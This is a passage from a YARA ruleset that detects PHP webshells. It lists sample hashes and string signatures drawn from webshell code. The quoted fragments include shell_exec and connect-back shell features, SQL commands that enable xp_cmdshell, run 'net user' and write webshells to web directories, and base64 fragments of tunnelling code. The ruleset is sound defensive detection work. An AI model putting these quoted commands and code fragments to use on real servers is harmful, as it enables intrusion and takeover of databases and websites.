      $s3 = "<td><input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'></td>" fullword ascii
      $s4 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s5 = "$res = @pg_connect($server[0].':'.$server[1]?$server[1]:5432, $login, $pass);" fullword ascii
      $s6 = "'modify' => date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i]))," fullword ascii
      $s7 = "if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {" fullword ascii
      $s8 = "<input type=hidden name=p1 value='<?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?>'>" fullword ascii
      $s9 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'></td" ascii
      $s10 = "<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'></td" ascii
      $s11 = "<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>" fullword ascii
      $s12 = "<input type=hidden name=p3 value='<?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?>'>" fullword ascii
      $s13 = "<input type=hidden name=p2 value='<?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?>'>" fullword ascii
      $s14 = "if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {" fullword ascii
      $s15 = "} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {" fullword ascii
      $s16 = "}elseif(function_exists('shell_exec')) {" fullword ascii
      $s17 = "if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {" fullword ascii
      $s18 = "@file_put_contents($_POST['p1'],$_POST['p3']);" fullword ascii
      $s19 = "('%o', fileperms($_POST['p1'])),-4).'\"><input type=submit value=\">>\"></form>';" fullword ascii
      $s20 = "> - WSO <?=VERSION?></title>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__121
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, 9f074c6d53409f124b5eeb850502faf587d39a10.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash5 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash8 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash9 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash10 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash11 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash12 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash13 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash14 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash15 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash16 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash17 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash18 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash19 = "4a30b666f037d28d1b832a95a556d5b15d344fbcfb4756fc1374175e3da9b364"
      hash20 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash21 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
      hash22 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU" fullword ascii
      $s2 = "xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga" fullword ascii
      $s3 = "0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb" fullword ascii
      $s4 = "lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm" fullword ascii
      $s5 = "IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ" fullword ascii
      $s6 = "x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb" fullword ascii
      $s7 = "HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj" fullword ascii
      $s8 = "MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA" fullword ascii
      $s9 = "yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi" fullword ascii
      $s10 = "hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC" fullword ascii
      $s11 = "CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9" fullword ascii
      $s12 = "NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC" fullword ascii
      $s13 = "aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ" fullword ascii
      $s14 = "aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ" fullword ascii
      $s15 = "gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol" fullword ascii
      $s16 = "LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV" fullword ascii
      $s17 = "W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy" fullword ascii
      $s18 = "WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN" fullword ascii
      $s19 = "gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm" fullword ascii
      $s20 = "DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_122
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash10 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash11 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash12 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash13 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash14 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash15 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash16 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash17 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash18 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "if ($sql_dump_download)" fullword ascii
      $s2 = "if ($act == \"gofile\") {if (is_dir($f)) {$act = \"ls\"; $d = $f;} else {$act = \"f\"; $d = dirname($f); $f = basename($f);}}" fullword ascii
      $s3 = "$k=>$v) {if (strtoupper($k) != \"GLOBALS\") {strips($arr[\"$k\"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}" fullword ascii
      $s4 = "<b>Size</b></td><td> \".view_size(filesize($d.$f)).\"</td></tr><tr><td><b>MD5</b></td><td> \".md5_file($d.$f).\"</td></tr>\";" fullword ascii
      $s5 = "if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}" fullword ascii
      $s6 = "if (file_exists($mkdir)) {echo \"<b>Make Dir \\\"\".htmlspecialchars($mkdir).\"\\\"</b>: object alredy exists\";}" fullword ascii
      $s7 = "echo \"<b>DB:</b>&nbsp;<input type=\\\"text\\\" name=\\\"sql_db\\\" value=\\\"\".urlencode($sql_db).\"\\\"><br><br>\";" fullword ascii
      $s8 = "elseif (!mkdir($mkdir)) {echo \"<b>Make Dir \\\"\".htmlspecialchars($mkdir).\"\\\"</b>: access denied\";}" fullword ascii
      $s9 = "elseif ($sql_dump_savetofile)" fullword ascii
      $s10 = "$sql_act = \"dump\";}" fullword ascii
      $s11 = "if (!empty($rndcode)) {echo \"<b>Error: incorrect confimation!</b>\";}" fullword ascii
      $s12 = "values .= \"'\".addslashes($v).\"'\"; if ($funct) {$values .= \")\";} $values .= \", \"; $i++;}" fullword ascii
      $s13 = "ars($name).\"]\\\" value=\\\"\".htmlspecialchars($values[$name]).\"\\\" size=50></td></tr>\";" fullword ascii
      $s14 = "if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != \"edit\")" fullword ascii
      $s15 = "if (!empty($uploadfile[\"tmp_name\"]))" fullword ascii
      $s16 = "echo \"<tr><td><center><b>Affected rows: \".$affected.\"</center></td></tr>\";" fullword ascii
      $s17 = "if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))" fullword ascii
      $s18 = "\"<b>Error:</b> <br>\".$sql_query_error.\"<br>\";}" fullword ascii
      $s19 = "cho \"<b>Error:</b> <br>\".$sql_query_error.\"<br>\";}" fullword ascii
      $s20 = "if (!is_dir($d)) {echo \"<center><b>Permision denied!</b></center>\";}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0x6544 or uint16(0) == 0x2a2f ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _0353ae68b12b8f6b74794d3273967b530d0d526f_060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa4_123
{
   meta:
      description = "php17 - from files 0353ae68b12b8f6b74794d3273967b530d0d526f.php, 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
      hash2 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash3 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash4 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash5 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash6 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash7 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash8 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash9 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash10 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash11 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "header(\"Content-Disposition: attachment; filename=\".basename($_POST['p1']));" fullword ascii
      $s2 = "$tmp = array('name' => $dirContent[$i]," fullword ascii
      $s3 = "'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])" fullword ascii
      $s4 = "'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i])," fullword ascii
      $s5 = "die('<script>g(null,null,\"'.urlencode($_POST['p3']).'\",null,\"\")</script>');" fullword ascii
      $s6 = "'size' => @filesize($GLOBALS['cwd'].$dirContent[$i])," fullword ascii
      $s7 = "'path' => $GLOBALS['cwd'].$dirContent[$i]," fullword ascii
      $s8 = "if(@$_POST['p2']=='download') {" fullword ascii
      $s9 = "$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));" fullword ascii
      $s10 = "if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )" fullword ascii
      $s11 = "if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}" fullword ascii
      $s12 = "if(preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $match))" fullword ascii
      $s13 = "return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);" fullword ascii
      $s14 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslashes(h" ascii
      $s15 = "$drives .= '<a href=\"#\" onclick=\"g(\\'FilesMan\\',\\''.$drive.':/\\')\">[ '.$drive.' ]</a> ';" fullword ascii
      $s16 = "$_POST['p1'] = urldecode($_POST['p1']);" fullword ascii
      $s17 = "echo strlen($temp), \"\\n\", $temp;" fullword ascii
      $s18 = "for($i=strlen($_POST['p3'])-1;$i>=0;--$i)" fullword ascii
      $s19 = "if(!@rename($_POST['p1'], $_POST['p3']))" fullword ascii
      $s20 = "$files[] = array_merge($tmp, array('type' => 'file'));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _34127df2be5061288e2863da49b977a4a025273f_5425e9f71fca02fd3ac7a3ffa8dbd254afec8213_55254f8f1d961c9a832cf2c3f7747b3e510efbdf__124
{
   meta:
      description = "php17 - from files 34127df2be5061288e2863da49b977a4a025273f.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash2 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash3 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
      hash4 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
   strings:
      $x1 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x2 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
      $x3 = "Str[10] = \"Exec master.dbo.xp_cmdshell 'net user';\";" fullword ascii
      $s4 = "Str[7] = \"select 0xxxxx from mysql.user into outfile 'c:\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.php'\";" fullword ascii
      $s5 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s6 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $s7 = "Str[7] = \"EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\";" fullword ascii
      $s8 = "Str[5] = \"Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll');\";" fullword ascii
      $s9 = ":<input type=\"text\" name=\"ftphost\" value=\"{$ftphost}\" style=\"width:100px\">" fullword ascii
      $s10 = ":<input type=\"text\" name=\"ftppass\" value=\"{$ftppass}\" style=\"width:100px\"><br><br>" fullword ascii
      $s11 = ":<input type=\"text\" name=\"ftpuser\" value=\"{$ftpuser}\" style=\"width:100px\">" fullword ascii
      $s12 = "<option value=\"10\">xp_cmdshell exec</option>" fullword ascii
      $s13 = "Str[5] = \"select username,usertype,password from sysusers;\";" fullword ascii
      $s14 = ":<input type=\"text\" name=\"downfile\" value=\"{$getfile}\" style=\"width:100px\">" fullword ascii
      $s15 = ":<input type=\"text\" name=\"ftpfolder\" value=\"{$ftpfolder}\" style=\"width:200px\">" fullword ascii
      $s16 = "Str[5] = \"select user,password from mysql.user;\";" fullword ascii
      $s17 = "Str[3] = \"input 'D:\\\\createtable.sql';\";" fullword ascii
      $s18 = "Str[4] = \"shell netstat -an;\";" fullword ascii
      $s19 = "Str[2] = \"select RDB\\$FIELD_NAME from RDB\\$RELATION_FIELDS where RDB\\$RELATION_NAME='table_name';\";" fullword ascii
      $s20 = "Str[4] = \"select column_name from information_schema.columns where table_name='xxx' limit 1 offset n;\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05806173863ac450b499d538bc7713c7e8c869dd_145df8286e456945e2630ac284cadc77_1626580cc64569879a427931137aa9c2434d2c8c_254a3c59_125
{
   meta:
      description = "php17 - from files 05806173863ac450b499d538bc7713c7e8c869dd.php, 145df8286e456945e2630ac284cadc77.php, 1626580cc64569879a427931137aa9c2434d2c8c.php, 254a3c59f7e28d66209d48d9135291eb8cd0be83.php, 258297b62aeaf4650ce04642ad5f19be25ec29c9.php, 387dd602d5fe0192968d4798b87841e47d854e27.php, 6454cc5ab73143d72cf0025a81bd1fe710351b44.php, 90c74648f3e196fda8c32e3a0cc846892ed759e1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc0c3100095d9397871f92538344cc185be21fbc7d0715b05bb1fcc5ef598813"
      hash2 = "a2483c07b4aab2d4fab08d0a70ccbaab91c10cf2e1952fa55befa397c82d1cd5"
      hash3 = "c3db747c7f3d5d350e1c5bfe54200aa727b335bb4e5123d67ef9102aefdaa331"
      hash4 = "75d34237cc7dab59582abafb3069af0b1c240d860766e818953ff7df7eca87f3"
      hash5 = "b4aa7508f9deba56f605ceb7fae290d5c0f9f23515fa6fe3b09fa3b1ce2eb073"
      hash6 = "8c476a6b67fdba2ddbc25daacc6b316daccd91206750419e7080c95f4b41d817"
      hash7 = "236d757657925bf85cb39eb13606e3a36df8c49b26365639e4dad81752060ee0"
      hash8 = "aacb1f283fd9383949e2ec4b6e3242660c813f0e65a02bed1874ff63bcf28dd6"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s6 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s7 = "//Connect Back -Firewall Bypass" fullword ascii
      $s8 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s9 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s10 = "//cmd-command line" fullword ascii
      $s11 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s12 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s13 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod\";" fullword ascii
      $s14 = "<span style=\"text-decoration: none\">Fake mail</span></font></a></b></p>" fullword ascii
      $s15 = "$fdownload=$_GET['fdownload'];" fullword ascii
      $s16 = "<font color='#008000' size='2'><b>Download</b></font></td>" fullword ascii
      $s17 = "<span style=\"text-decoration: none\"><font color=\"#000000\">Connect Back</font></span></a></font></b></p>" fullword ascii
      $s18 = "$uploadfile = $rpath.\"/\" . $_FILES['userfile']['name'];" fullword ascii
      $s19 = "<form enctype='multipart/form-data' action='' method='POST'>" fullword ascii
      $s20 = "$cmd=$_POST['cmd'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_26aff140c2f73f11d0c78b8823ade092_528f2ab667dc8492e589a00c579edaaf16f03859_7a088b01_127
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 26aff140c2f73f11d0c78b8823ade092.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, 7a088b0114a6147072c70403f5b3c47fe0145984.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php, arabicspy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "1a96d8b149d930cfea410ba3c247efac03bd71e4fec0460f3522950b1fd13a19"
      hash3 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash4 = "6b84760d22eabc648f8ecd31f6ef51c4b679e1e9329bcaade78878ca8a884c32"
      hash5 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
      hash6 = "9ca895d820411a2b1c4f1f5ca668d10550b897342126ffee1b58f3f1e9d38897"
   strings:
      $x1 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s3 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";" fullword ascii
      $s4 = "$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);" fullword ascii
      $s5 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {" fullword ascii
      $s6 = "elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {" fullword ascii
      $s7 = "if ($_POST['backuptype'] == 'download') {" fullword ascii
      $s8 = "$a = @$shell->RegDelete($_POST['delregname']);" fullword ascii
      $s9 = "$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);" fullword ascii
      $s10 = "$mysqldata.= sqldumptable($currow[0]);" fullword ascii
